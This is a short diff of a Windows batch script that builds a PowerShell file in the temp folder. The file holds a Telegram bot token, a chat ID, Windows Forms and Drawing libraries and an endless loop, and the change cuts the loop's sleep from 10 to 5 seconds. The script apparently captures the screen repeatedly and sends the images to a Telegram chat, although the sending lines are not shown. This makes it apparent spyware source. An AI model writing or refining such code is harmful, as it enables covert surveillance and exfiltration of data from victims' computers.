@@ -13,7 +13,7 @@ set "c=5709299213"
 :: Creare lo script PowerShell
 echo $botToken = '%b%' > %temp%\telegram_send.ps1
 echo $chatId = '%c%' >> %temp%\telegram_send.ps1
-echo $sleepTime = 10 >> %temp%\telegram_send.ps1
+echo $sleepTime = 5 >> %temp%\telegram_send.ps1
 echo Add-Type -AssemblyName System.Windows.Forms >> %temp%\telegram_send.ps1
 echo Add-Type -AssemblyName System.Drawing >> %temp%\telegram_send.ps1
 echo while($true) { >> %temp%\telegram_send.ps1
